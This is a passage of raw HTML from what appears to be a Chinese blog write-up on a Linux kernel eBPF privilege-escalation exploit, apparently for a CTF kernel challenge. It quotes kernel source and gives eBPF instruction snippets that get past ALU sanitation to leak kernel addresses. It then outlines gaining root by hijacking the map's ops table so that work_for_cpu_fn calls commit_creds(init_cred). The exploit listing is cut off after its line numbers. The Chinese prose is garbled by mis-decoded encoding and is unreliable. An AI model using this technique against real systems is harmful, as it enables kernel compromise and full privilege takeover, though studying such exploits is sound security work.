class="number">8</span>);</span><br><span class="line"><span class="keyword">void</span> *ptrs[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">void</span> __percpu *pptrs[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨ä¸Šé¢çš„<code>bpf_map</code>ç»“æ„ä½“çš„å¼€å§‹ä½ç½®æœ‰ä¸€ä¸ªopsæŒ‡é’ˆï¼Œè€Œæ ¹æ®ä»¥å¾€çš„ç»éªŒopsä¸­åŒ…å«äº†å¾ˆå¤šå†…æ ¸å‡½æ•°çš„æŒ‡é’ˆï¼Œå½“ç„¶äº‹å®ä¹Ÿæ­£å¦‚æ­¤</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> <span class="title">array_map_ops</span> =</span> &#123;</span><br><span class="line">.map_meta_equal = array_map_meta_equal,</span><br><span class="line">.map_alloc_check = array_map_alloc_check,</span><br><span class="line">.map_alloc = array_map_alloc,</span><br><span class="line">.map_free = array_map_free,</span><br><span class="line">.map_get_next_key = array_map_get_next_key,</span><br><span class="line">.map_lookup_elem = array_map_lookup_elem,</span><br><span class="line">.map_update_elem = array_map_update_elem,</span><br><span class="line">.map_delete_elem = array_map_delete_elem,</span><br><span class="line">.map_gen_lookup = array_map_gen_lookup,</span><br><span class="line">.map_direct_value_addr = array_map_direct_value_addr,</span><br><span class="line">.map_direct_value_meta = array_map_direct_value_meta,</span><br><span class="line">.map_mmap = array_map_mmap,</span><br><span class="line">.map_seq_show_elem = array_map_seq_show_elem,</span><br><span class="line">.map_check_btf = array_map_check_btf,</span><br><span class="line">.map_lookup_batch = generic_map_lookup_batch,</span><br><span class="line">.map_update_batch = generic_map_update_batch,</span><br><span class="line">.map_btf_name = <span class="string">&quot;bpf_array&quot;</span>,</span><br><span class="line">.map_btf_id = &amp;array_map_btf_id,</span><br><span class="line">.iter_seq_info = &amp;iter_seq_info,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å› ä¸ºæˆ‘ä»¬ä¸Šé¢æ‰€é€‰æ‹©çš„ç±»å‹ä¸ºæ•°ç»„ï¼Œæ‰€ä»¥è¿™é‡Œopsä¼šåŒ…å«<code>array_map_ops</code>æŒ‡é’ˆï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒæ¥æ³„æ¼å†…æ ¸åœ°å€ã€‚</p><p>å¦‚æœæˆ‘ä»¬ä½¿ç”¨<code>BPF_FUNC_map_lookup_elem</code>æ¥è¿›è¡Œå‡½æ•°è°ƒç”¨çš„è¯ï¼Œæ ¹æ®ä¸Šè¿°opsæˆ‘ä»¬æœ€ç»ˆä¼šè°ƒç”¨åˆ°<code>array_map_lookup_elem</code>å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Called from syscall or from eBPF program */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">array_map_lookup_elem</span><span class="params">(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_array</span> *<span class="title">array</span> =</span> container_of(<span class="built_in">map</span>, struct bpf_array, <span class="built_in">map</span>);</span><br><span class="line">u32 index = *(u32 *)key;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(index &gt;= <span class="built_in">array</span>-&gt;<span class="built_in">map</span>.max_entries))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">array</span>-&gt;value + <span class="built_in">array</span>-&gt;elem_size * (index &amp; <span class="built_in">array</span>-&gt;index_mask);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„æ³¨é‡Šä¹Ÿè¯´æ˜äº†ï¼Œè¿™é‡Œå…è®¸è¢«syscallä»¥åŠeBPFç¨‹åºè°ƒç”¨ã€‚è€Œè¿™é‡Œç¨‹åºçš„è¿”å›å†…å®¹åˆ™æ˜¯<code>map_ptr.value</code>æ‰€ä»¥å¯ä»¥æ ¹æ®è¿™é‡Œçš„åç§»å¾—å‡ºè¿”å›å†…å®¹ä¸º<code>map_ptr+0x110</code>çš„åœ°å€ã€‚</p><p>å¯èƒ½åˆ°è¿™é‡Œå¤§å®¶éƒ½åº”è¯¥æœ‰ä¸€å®šçš„æ€è·¯äº†ï¼Œä¸è¿‡è¿™é‡Œè¿˜å­˜åœ¨ä¸€ä¸ªæ£€æµ‹<code>ALU Sanitation</code>ï¼Œåœ¨è¿™ä¸ªæ£€æµ‹ä¸­<code>alu_limit</code>è¡¨ç¤ºæ“ä½œå…è®¸æœ€å¤§å€¼ï¼Œè¿™é‡Œåšé™åˆ¶çš„ä¸»è¦ç›®çš„æ˜¯é˜²æ­¢é€šè¿‡ebpfç¨‹åºè°ƒç”¨å‡ºç°è¶Šç•Œæˆ–è®¿é—®ä¸å±äºä»–è‡ªå·±çš„åœ°å€åŒºåŸŸæ—¶æ‰€åšçš„é™åˆ¶ï¼Œå¦‚æœæˆ‘ä»¬<code>src_reg</code>çš„å€¼å¤§äº<code>alu_limit</code>æˆ–è€…ä¸ä¹‹ç¬¦å·ç›¸åï¼Œé‚£ä¹ˆ<code>src_reg</code>ä¼šè¢«å¼ºåˆ¶åˆ¶ä¸º0ï¼Œå¯¼è‡´æŒ‡é’ˆè¿ç®—å¤±è´¥ã€‚ä¸è¿‡åœ¨è¿™é‡Œç»•è¿‡çš„æ–¹å¼ä¹Ÿæ¯”è¾ƒç®€å•ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BPF_MOV64_REG(BPF_REG_0, EXP_REG),</span><br><span class="line">BPF_ALU64_IMM(BPF_ADD, OOB_REG, <span class="number">0x1000</span>),</span><br><span class="line">BPF_ALU64_IMM(BPF_MUL, BPF_REG_0, <span class="number">0x1000</span> - <span class="number">1</span>),</span><br><span class="line">BPF_ALU64_REG(BPF_SUB, OOB_REG, BPF_REG_0),</span><br><span class="line">BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br></pre></td></tr></table></figure><p>å› ä¸ºè¿™é‡Œå­˜åœ¨ä¸€ä¸ªverifierä¸º0çš„å¯„å­˜å™¨<code>EXP_REG</code>é‚£ä¹ˆæˆ‘ä»¬å¦‚æœè¿›è¡Œä¸Šè¿°ä»£ç ä¸­çš„æ“ä½œå³å¯æ˜¯çš„<code>alm_limit</code>ä¸º<code>0x1000</code></p><p>é‚£ä¹ˆåœ¨åšå®Œä¸Šæ–‡ä¸­æ‰€æœ‰æ“ä½œä¹‹åå¯ä»¥æ­£å¼è¿›å…¥æ³„æ¼é˜¶æ®µäº†ï¼Œå…¶å®æœ‰äº†ä¸Šè¿°æ€è·¯ï¼Œè¿™é‡Œæ³„æ¼èµ·æ¥å°±æ¯”è¾ƒç®€å•äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BPF_ALU64_IMM(BPF_MUL, EXP_REG, <span class="number">0x110</span>),</span><br><span class="line">BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br><span class="line">BPF_LDX_MEM(BPF_DW, BPF_REG_0, OOB_REG, <span class="number">0</span>),</span><br><span class="line">BPF_STX_MEM(BPF_DW, STORE_REG, BPF_REG_0, <span class="number">8</span>),</span><br><span class="line">BPF_EXIT_INSN(),</span><br></pre></td></tr></table></figure><p>åªéœ€è¦å°†<code>oob_map</code>çš„<code>array_map_ops</code>æ”¾åˆ°<code>store_map</code>çš„valueä¸­å»å³å¯ã€‚å¹¶ä¸”åœ¨<code>bpf_map</code>ä¸­å­˜åœ¨ä¸€ä¸ªæˆå‘˜workæ˜¯ä¸€ä¸ªåŒå‘é“¾è¡¨çš„ç»“æ„ï¼Œå…¶ä¸­å­˜åœ¨ä¸€ä¸ªåœ°å€æŒ‡å‘è‡ªå·±ï¼Œè¿™æ ·æˆ‘ä»¬å³å¯è·å–<code>oob_map</code>çš„åœ°å€äº†ã€‚</p><p>ä¸è¿‡åœ¨å®é™…åšçš„è¿‡ç¨‹ä¸­ä¼šå‘ç°ä¸Šè¿°åˆ©ç”¨æ–¹å¼ä¼šå­˜åœ¨è®¸å¤šé—®é¢˜ï¼Œè¾¾ä¸åˆ°çœŸæ­£æ„ä¹‰ä¸Šçš„ä»»æ„å†…å­˜è¯»ï¼Œè¿™é‡Œæˆ‘å¿˜è®°äº†å…·ä½“åŸå› ï¼Œåº”è¯¥æ˜¯ä¼šæ£€æµ‹å¯„å­˜å™¨çš„å€¼ä¸èƒ½ä¸ºå †æ ˆä»¥å¤–çš„åœ°å€ï¼Œæ‰€ä»¥è¿˜éœ€è¦åˆ©ç”¨ä¸€ä¸ªæ–°çš„åŠæ³•ï¼Œ<code>obj_get_info_by_fd</code>å‡½æ•°:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_map_get_info_by_fd</span><span class="params">(struct file *file,</span></span></span><br><span class="line"><span class="params"><span class="function">  struct bpf_map *<span class="built_in">map</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">const</span> <span class="keyword">union</span> bpf_attr *attr,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">union</span> bpf_attr __user *uattr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info</span> __<span class="title">user</span> *<span class="title">uinfo</span> =</span> u64_to_user_ptr(attr-&gt;info.info);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info</span> <span class="title">info</span>;</span></span><br><span class="line">u32 info_len = attr-&gt;info.info_len;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">err = bpf_check_uarg_tail_zero(uinfo, <span class="keyword">sizeof</span>(info), info_len);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">info_len = <span class="keyword">min_t</span>(u32, <span class="keyword">sizeof</span>(info), info_len);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;info, <span class="number">0</span>, <span class="keyword">sizeof</span>(info));</span><br><span class="line">info.type = <span class="built_in">map</span>-&gt;map_type;</span><br><span class="line">info.id = <span class="built_in">map</span>-&gt;id;</span><br><span class="line">info.key_size = <span class="built_in">map</span>-&gt;key_size;</span><br><span class="line">info.value_size = <span class="built_in">map</span>-&gt;value_size;</span><br><span class="line">info.max_entries = <span class="built_in">map</span>-&gt;max_entries;</span><br><span class="line">info.map_flags = <span class="built_in">map</span>-&gt;map_flags;</span><br><span class="line"><span class="built_in">memcpy</span>(info.name, <span class="built_in">map</span>-&gt;name, <span class="keyword">sizeof</span>(<span class="built_in">map</span>-&gt;name));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">map</span>-&gt;btf) &#123;</span><br><span class="line">info.btf_id = btf_obj_id(<span class="built_in">map</span>-&gt;btf);</span><br><span class="line">info.btf_key_type_id = <span class="built_in">map</span>-&gt;btf_key_type_id;</span><br><span class="line">info.btf_value_type_id = <span class="built_in">map</span>-&gt;btf_value_type_id;</span><br><span class="line">&#125;</span><br><span class="line">info.btf_vmlinux_value_type_id = <span class="built_in">map</span>-&gt;btf_vmlinux_value_type_id;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bpf_map_is_dev_bound(<span class="built_in">map</span>)) &#123;</span><br><span class="line">err = bpf_map_offload_info_fill(&amp;info, <span class="built_in">map</span>);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (copy_to_user(uinfo, &amp;info, info_len) ||</span><br><span class="line">    put_user(info_len, &amp;uattr-&gt;info.info_len))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">u32 <span class="title">btf_obj_id</span><span class="params">(<span class="keyword">const</span> struct btf *btf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> btf-&gt;id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬æ§åˆ¶<code>bpf_map</code>ç»“æ„ä½“ä¸­çš„btfå³å¯å®ç°çœŸæ­£æ„ä¹‰ä¸Šçš„ä»»æ„åœ°å€æ³„æ¼ã€‚</p><h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p>å…¶å®è¿™é‡Œçš„ææƒæ–¹å¼å¯èƒ½å¤§å®¶éƒ½èƒ½æƒ³åˆ°ï¼Œå› ä¸ºåœ¨<code>bpf_map</code>ç»“æ„ä½“ä¸­å­˜åœ¨ä¸€ä¸ªç»“æ„ä½“ä¸ºopsï¼Œè€Œæˆ‘ä»¬åœ¨ä»¥å¾€çš„kernelé¢˜ç›®ä¸­åˆ©ç”¨çš„æ¯”è¾ƒå¤šçš„å°±æ˜¯è¿™ä¸ªopsï¼Œæ‰€ä»¥è¿™é‡ŒåŒæ ·å¯ä»¥è¿™æ ·ä½¿ç”¨ã€‚</p><p>è¿™é‡Œé€‰æ‹©çš„æœ€ç»ˆåˆ©ç”¨å‡½æ•°æ˜¯å‰é¢æåˆ°è¿‡çš„<code>work_for_cpu_fn</code>å‡½æ•°ã€‚è¿‡ç¨‹å°±æ˜¯ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦å…ˆæ³„æ¼å‡ºå½“å‰opsç»“æ„ä½“ä¸­çš„æ‰€æœ‰å‡½æ•°åœ°å€ï¼Œéšåå°†å‡½æ•°åœ°å€ä¸­<code>map_get_next_key</code>å‡½æ•°æ‰€åœ¨ä½ç½®çš„æŒ‡é’ˆæ›¿æ¢ä¸º<code>work_for_cpu_fn</code>ï¼Œç´§æ¥ç€å†™å…¥åˆ°<code>oob_map</code>çš„valueä¸­å»ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_get_next_key</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> __user *ukey = u64_to_user_ptr(attr-&gt;key);</span><br><span class="line"><span class="keyword">void</span> __user *unext_key = u64_to_user_ptr(attr-&gt;next_key);</span><br><span class="line"><span class="keyword">int</span> ufd = attr-&gt;map_fd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line"><span class="keyword">void</span> *key, *next_key;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CHECK_ATTR(BPF_MAP_GET_NEXT_KEY))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">f = fdget(ufd);</span><br><span class="line"><span class="built_in">map</span> = __bpf_map_get(f);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line"><span class="keyword">if</span> (!(map_get_sys_perms(<span class="built_in">map</span>, f) &amp; FMODE_CAN_READ)) &#123;</span><br><span class="line">err = -EPERM;</span><br><span class="line"><span class="keyword">goto</span> err_put;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ukey) &#123;</span><br><span class="line">key = __bpf_copy_key(ukey, <span class="built_in">map</span>-&gt;key_size);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(key)) &#123;</span><br><span class="line">err = PTR_ERR(key);</span><br><span class="line"><span class="keyword">goto</span> err_put;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">key = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line">next_key = kvmalloc(<span class="built_in">map</span>-&gt;key_size, GFP_USER);</span><br><span class="line"><span class="keyword">if</span> (!next_key)</span><br><span class="line"><span class="keyword">goto</span> free_key;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bpf_map_is_dev_bound(<span class="built_in">map</span>)) &#123;</span><br><span class="line">err = bpf_map_offload_get_next_key(<span class="built_in">map</span>, key, next_key);</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rcu_read_lock();</span><br><span class="line">err = <span class="built_in">map</span>-&gt;ops-&gt;map_get_next_key(<span class="built_in">map</span>, key, next_key);</span><br><span class="line">rcu_read_unlock();</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> free_next_key;</span><br><span class="line"></span><br><span class="line">err = -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (copy_to_user(unext_key, next_key, <span class="built_in">map</span>-&gt;key_size) != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> free_next_key;</span><br><span class="line"></span><br><span class="line">err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">free_next_key:</span><br><span class="line">kvfree(next_key);</span><br><span class="line">free_key:</span><br><span class="line">kvfree(key);</span><br><span class="line">err_put:</span><br><span class="line">fdput(f);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé€‰æ‹©è¿™ä¸ªå‡½æ•°çš„å¾ˆæ˜æ˜¾ï¼Œåœ¨ä¸­é€”ç›´æ¥è°ƒç”¨äº†opsä¸­çš„<code>map_get_next_key</code>ï¼Œå¹¶ä¸”ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºmapã€‚é‚£ä¹ˆè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¦‚æœä¿®æ”¹opsä¸ºæˆ‘ä»¬çš„<code>bpf-&gt;value</code>å³å¯è°ƒç”¨åˆ°<code>work_for_cpu_fn</code>ï¼Œé‚£ä¹ˆåœ¨æ ¹æ®<code>work_for_cpu_fn</code>å‡½æ•°å†…éƒ¨è°ƒæ•´<code>commit_creds</code>å’Œ<code>init_cred</code>å³å¯ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span 